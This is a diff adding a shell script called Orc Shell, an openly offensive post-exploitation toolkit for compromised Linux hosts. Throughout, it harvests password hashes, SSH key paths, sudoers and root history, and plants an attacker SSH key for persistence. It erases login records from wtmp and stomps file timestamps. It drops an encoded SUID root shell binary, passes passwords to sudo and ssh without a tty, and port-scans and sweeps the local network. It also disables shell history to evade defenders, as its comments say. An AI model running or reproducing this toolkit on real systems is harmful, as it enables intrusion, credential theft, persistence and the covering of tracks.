@@ -1,0 +1,368 @@
+#!/bin/sh
+# o.rc
+OVERSION="0.3"
+# NOTES
+# all the non-POSIX for loops have been removed
+# all the SIGs in trap changed
+# aliasing echo to /bin/echo to get around POSIX echo having no flags
+# removed the non-POSIX [[ stuff ]]
+# curl and dig now have wget and host as backups
+# ipcalc should now be optional
+# support for ip instead of ifconfig and arp
+
+alias 'echo'='/bin/echo'
+trap "rm -rf /dev/shm/.q" EXIT TERM INT 
+backup=`cat $ENV`
+NHOME=""
+
+getsec() {
+echo "Let's see if there are any defences."
+selinuxenabled >/dev/null 2>/dev/null
+	if echo $? | grep -q 0;
+	then echo "SELinux is enabled."
+	fi
+type aa-status >/dev/null 2>/dev/null
+	if echo $? | grep -q 0;
+	then echo "AppArmor is probably installed."
+	fi
+	if cat /proc/self/status | grep -q PaX; then
+	echo "GrSec and PaX live here."
+	fi
+}
+
+getinfo() {
+echo "Gathering useful command output."
+echo "Find it in $HOME/f.tar.xz"
+mkdir $HOME/files
+OUTP=$HOME/files/
+getent passwd > $OUTP/passwd.txt
+uname -a > $OUTP/uname.txt
+ps -weFH > $OUTP/ps.txt
+w > $OUTP/w.txt
+last -i > $OUTP/last.txt
+uptime > $OUTP/uptime.txt
+id > $OUTP/id.txt
+date > $OUTP/date.txt
+cat /proc/cpuinfo > $OUTP/cpuinfo.txt
+free -g > $OUTP/free.txt
+route -n > $OUTP/route.txt
+cat /etc/hosts > $OUTP/hosts.txt
+cat /etc/resolv.conf > $OUTP/resolv.txt
+rpcinfo > $OUTP/rpcinfo.txt
+lsmod > $OUTP/lsmod.txt
+lsusb > $OUTP/lsusb.txt
+mount > $OUTP/mount.txt
+df > $OUTP/df.txt
+crontab -l > $OUTP/user_crontab.txt 2>/dev/null
+	if hash ifconfig 2>/dev/null; then
+		ifconfig -a > $OUTP/ifconfig.txt
+	else
+		ip link > $OUTP/ifconfig.txt
+	fi
+	
+	netstat -peanut > $OUTP/netstat.txt
+	if [[ $EUID -eq 0 ]]; then
+		getent shadow > $OUTP/shadow.txt
+		find /home/ -name id_rsa > $OUTP/ssh_keys.txt
+		cat /etc/sudoers > $OUTP/sudoers.txt
+		cat /etc/crontab > $OUTP/crontab.txt
+		iptables -L > $OUTP/iptables.txt
+                cat /var/log/secure > ./secure.txt
+		cat /root/.bash_history > ./roothist.txt
+		cat /etc/ssh/sshd_config > ./sshd_config.txt
+		ls -al /root/ > ./root_dir.txt
+		#inelegant hack
+		netstat -peanut > $OUTP/netstat.txt
+		if hash getsebool 2>/dev/null; then
+			getenforce >> ./selinux.txt
+			getsebool -a >> ./selinux.txt
+			sestatus >> ./selinux.txt
+		fi
+
+	fi
+tar -cf - $OUTP | xz -c -9 > $HOME/f.tar.xz
+rm -rf $OUTP
+}
+
+getusers() {
+echo "Listing valid users with shells."
+getent passwd | grep -f /etc/shells | grep -v "nologin\|false" | cut -d: -f1
+}
+
+getuservices() {
+echo "Listing all service processes with accounts in passwd."
+ps --no-header -weFH | grep -v $(getent passwd | grep -f /etc/shells | grep -v nologin | grep -v false | awk -F":" '{print $1}' | tr '\n' '|' | sed s'/|/\\\|/g'  | sed s'/..$//')
+}
+
+getidle() {
+ptys=`ls /dev/pts | grep '[[:digit:]]' | sort -g | tr '\n' ' '`
+echo $ptys | tr ' ' '\n' | while read i;do
+	echo -ne "PTY $i has been idle for "
+	idler=`stat -t /dev/pts/$i | awk -F " " '{ print $12 }'`
+	echo -ne "$((`date +%s` - $idler)) seconds.\n"
+done
+}
+
+srm() {
+shred -vzfun 2 $1
+}
+
+qssh() {
+if tty | grep -q "not"; then
+	echo '#!/bin/bash' > /dev/shm/.q/.k
+	echo "echo $1" >> /dev/shm/.q/.k
+	chmod a+x /dev/shm/.q/.k
+	shift
+	DISPLAY="" SSH_ASKPASS="/dev/shm/.q/.k" ssh -T $@
+else
+	echo "You've got a tty. You can't use qssh."
+fi
+}
+
+qsu() {
+echo '#!/bin/bash' > /dev/shm/.q/.c
+echo "echo $1" >> /dev/shm/.q/.c
+chmod a+x /dev/shm/.q/.c
+shift
+SUDO_ASKPASS=/dev/shm/.q/.c sudo -A "$@"
+rm /dev/shm/.q/.c
+}
+
+getpty() {
+SHELL=$(command -v sh)
+#echo "$backup" > $ENV
+ENV=$ENV script -c sh /dev/null
+}
+
+keyinstall() {
+touch /dev/shm/.q/.ssh
+touch -r /
+sshkey="ssh-rsa [YOUR KEY HERE] `whoami`@`hostname`"
+echo $sshkey >> $NHOME/.ssh/authorized_keys
+}
+
+psgrep() {
+ps -weFH | grep $1 | grep -v grep
+}
+
+getjail() {
+ttt=0
+echo "Checking to see if we're in one giant simulation..."
+	if ls -di --color=never / | grep -vqe "^2.*/$"; then
+	TTT=1
+	echo "We're in a chroot."
+	fi
+	if cat /proc/cpuinfo | grep -qi "hypervisor"; then
+	echo "Virtual machine!"
+	TTT=1
+	fi
+	if dmesg | grep -qi "hypervisor"; then
+	echo "Virtual machine!"
+	TTT=1
+	fi
+	if echo $TTT | grep -vq "1"; then
+	echo "Bare metal!"
+	fi
+}
+
+portscan() {
+porta="21 22 23 80 443 8080 8443 129 445 3389 3306"
+echo "Starting portscan..."
+echo $porta | tr ' ' '\n' | while read i;do
+bash -c "echo '' > /dev/tcp/$1/$i" 2>/dev/null
+	if echo $? | grep -q 0; then
+	echo "Host $1 port $i open"
+	fi
+done
+}
+
+fpssh() {
+ssh-keyscan $1
+}
+
+getip() {
+#we use akamai and google here because they're gonna look less dodgy in SOC's lolgs
+echo "Attempting to get IP..."
+echo -ne "HTTP says: "
+	if hash curl>/dev/null; then
+	curl -k https://whatismyip.akamai.com
+	echo -ne "\n(used curl)"
+	else
+	wget -qO- --no-check-certificate https://whatismyip.akamai.com
+	echo -ne "\n(used wget)"
+	fi
+echo ""
+echo -ne "DNS says: "
+	if hash dig>/dev/null; then
+	dig TXT +short o-o.myaddr.l.google.com @ns1.google.com | tr -d \"
+	echo -ne "(used dig)\n"
+	else
+	host -t txt o-o.myaddr.l.google.com ns1.google.com | grep descriptive | awk -F ' ' '{print $4}' | tr -d '"' | tr -d "\n"
+	echo -ne "(used host)\n"
+	fi
+}
+
+getnet() (
+#i'm sorry
+
+sorry(){
+#this needs work
+	if hash ipcalc 2>/dev/null; then
+	echo "Pinging IPs in the background..."
+		if hash ifconfig 2>/dev/null; then
+		valid=$(seq -f $(ipcalc -n --minaddr --maxaddr `ifconfig | grep inet | grep -i broadcast | awk -F ' ' '{print $2" "$4}'` | awk -F "=" '{print $2 " "}' | sed s/0/%g/ |tr -d '\n' | awk -F'.' '{print $1"."$2"."$3"."$4" "$7" "$10}' | awk -F " " '{print $1" "$3" "$5}' | tr -d '\n'))
+		echo $valid | tr ' ' '\n' | while read i;do
+			 if ping -c1 -q $i | grep -q "\ 0%"; then
+			 echo $i is alive >> /dev/shm/.q/ips
+			fi
+		done
+	else 
+	valid=$(seq -f $(ipcalc -n --minaddr --maxaddr `ip addr show | grep inet | grep -i "broadcast\|brd" | awk -F ' ' '{print $2}'` | awk -F "=" '{print $2 " "}' | sed s/0/%g/ |tr -d '\n' | awk -F'.' '{print $1"."$2"."$3"."$4" "$7" "$10}' | awk -F " " '{print $1" "$3" "$5}' | tr -d '\n'))
+	echo $valid | tr ' ' '\n' | while read i;do
+		 if ping -c1 -q $i | grep -q "\ 0%"; then
+		 echo $i is alive >> /dev/shm/.q/ips
+		fi
+	done
+	fi
+	else echo "No ipcalc. Checking if we've got a /24 and then pinging the first one..."
+		if hash ifconfig 2>/dev/null; then
+		if ifconfig | grep -q "255.255.255.0"; then 
+		INPUT=$(seq -f `ifconfig | grep inet | grep -i broadcast | grep -v inet6 | grep "255.255.255.0" | head -n1 | awk -F " " '{print $2}' | awk -F '.' '{print $1"."$2"."$3".%g 1 244"}'`)
+		echo $INPUT | tr ' ' '\n' | while read i;do
+			if ping -c1 -q $i | grep -q "\ 0%"; then
+			echo $i is alive >> /dev/shm/.q/ips
+			fi
+		done
+		else 
+			if ip addr show | grep -E '/24*.brd'; then
+			INPUT=$(seq -f `ip addr show | grep brd |grep "/24" | head -n 1| awk -F " " {'print $2'} | awk -F '.' '{print $1"."$2"."$3".%g 1 244"}'`)
+			echo $INPUT | tr ' ' '\n' | while read i;do
+				 if ping -c1 -q $i | grep -q "\ 0%"; then
+				 echo $i is alive >> /dev/shm/.q/ips
+				fi
+			done
+			fi
+		fi
+	fi
+fi
+}
+
+valida=""
+valid=""
+
+echo "Let's see what we can find on the network..."
+echo "ARP table:"
+	if hash arp 2>/dev/null; then
+	arp -na | grep ether |awk -v FS="(\\\(|\\\))" '{print $2}'
+	else
+	ip neigh show | awk -F " " '{print $1}'
+	fi
+echo "Pinging broadcast."
+echo "Please wait..."
+	if hash ifconfig 2>/dev/null; then
+	ping -c3 -i 10 -b $(ipcalc -b `ifconfig | grep inet | grep -i broadcast | awk -F ' ' '{print $2" "$4}'` | awk -F "=" '{print $2 " "}' | tr -d "\n")
+	else ping -c3 -i 10 -b $(ip addr show | grep inet | grep brd | awk -F ' ' '{print $4}')
+	fi
+echo "Broadcast ping is done."
+echo "Pulling known hosts for your user and writing to /dev/shm/.q/kh..."
+cat $NHOME/.ssh/known_hosts | awk -F ' ' '{print $1}' > /dev/shm/.q/kh
+sorry &
+
+
+)
+
+wiper() {
+cat /var/log/wtmp | utmpdump | grep -v "$1" > /dev/shm/.q/.l
+touch -r /var/log/wtmp /dev/shm/.q/.l
+cat /dev/shm/.q/.l | utmpdump -r -o /var/log/wtmp
+touch -r /dev/shm/.q/.l /var/log/wtmp
+}
+
+getrel() {
+cat /etc/*release | grep PRETTY | awk -F "=" '{print $2}' | tr --delete '"'
+}
+
+getenum() {
+echo "Doing some basic listing of the usual suspects..."
+echo -ne "Kernel: "
+uname -rv
+echo -ne "glibc: "
+`ldd $(command -v id) | grep libc.so | awk -F " " '{print $3}'` | grep -i version | grep -v crypt
+echo -ne "dbus: "
+dbus-daemon --version | grep Daemon
+echo -ne "Init system is: "
+ps -p 1 | grep -v CMD| awk -F " " '{ print $4 }'
+
+}
+
+gethelp() {
+echo "A probably non-comprehensive list of functionality in Orc v$OVERSION."
+echo "[*] getenum - get kernel, glibc, and dbus versions"
+echo "[*] getinfo - create a tar.xz of useful command output"
+echo "[*] getrel - attempt to get the OS release file."
+echo "[*] getip - get external IP from akamai and google (HTTP and DNS)"
+echo "[*] getjail - check if we're in a chroot/VM"
+echo "[*] getsec - check if the big three security MAC programs are around"
+echo "[*] getusers - pull all users with a shell"
+echo "[*] getpty - pop a pty with script"
+echo "[*] getidle - list all ptys and their idle times accurately."
+echo "[*] getnet - attempt to enumerate hosts on the local network with ping"
+echo "[*] getuservices - list all running services with non-user accounts in passwd"
+echo "[*] portscan - run a portscan against common ports - portscan [host]"
+echo "[*] srm - alias for secure shredding of files."
+echo "[*] qsu - sudo without a tty - qsu [password] [normal arguments]"
+echo "[*] qssh - ssh without a tty - qssh [password] [normal arguments]"
+echo "[*] wiper - remove entries from wtmp - wiper [string to grep out]"
+echo "[*] fpssh - pull ssh remote host fingerprints - fpssh [host]"
+echo "[*] stomp - alias for touch -r (needs arguments)"
+echo "[*] tools - check for common tools"
+echo "[*] dropsuid - drop tiny suid shell - dropsuid > [file]"
+}
+
+mkdir /dev/shm/.q
+cd /dev/shm/.q
+
+alias 'stomp'='touch -r'
+alias 'tools'='type dig perl python gcc nc openssl wget strace gcore nmap gdb curl wget tcpdump'
+alias 'dropsuid'='echo "f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAA
+AAAAAIAECACABAgHAAAABwAAAAUAAAAAEAAA6AEAAADpWJCDwAxQw7sAAAAA6bgXAAAAzYDrAem7
+iIAECLgLAAAAMckx0usB6THJzYAAAC9iaW4vc2g=" | base64 -d'
+alias 'psfull'='ps -weFH'
+alias 'listener'='netstat -peanuto'
+alias 'netgrep'='netstat -peanuto | grep'
+alias 'getp'='getent passwd'
+
+alias 'ssh'='ssh -T'
+
+
+unset HISTFILE
+HISTSIZE=0
+umask 002
+ulimit -c 0
+
+echo "=========== Info ==========="
+echo "Short kernel info: "
+uname -rni
+echo "IP address on the network: "
+	if hash ifconfig 2>/dev/null; then
+	ifconfig | grep inet | grep -v inet6 | awk -F " " '{ print $2 }' | grep -v 127 | grep -v "::1$"
+	else
+	ip addr show | grep inet | grep -v inet6 | awk -F " " '{ print $2 }' | grep -v 127 | grep -v "::1$"
+	fi
+echo -ne "We are uid " 
+id -uz;echo -ne " - "; echo -ne "(";whoami | tr -d '\n';echo ")"
+echo -ne "Machine has been "
+uptime -p
+	if [ -f /etc/machine-id ]; then
+	echo -ne "Unique Machine ID: "
+	cat /etc/machine-id
+	fi
+echo "============================"
+echo "=== Welcome to Orc Shell ==="
+echo "Run gethelp to see a list of commands."
+echo "/dev/shm/.q should be deleted upon exit."
+PS1='$USER'"@`hostname`:"'$PWD'"$ " 
+HOME="/dev/shm/.q"
+NHOME=$(getent passwd | grep `id -u` | cut -d: -f 6)
+
+#rm $ENV
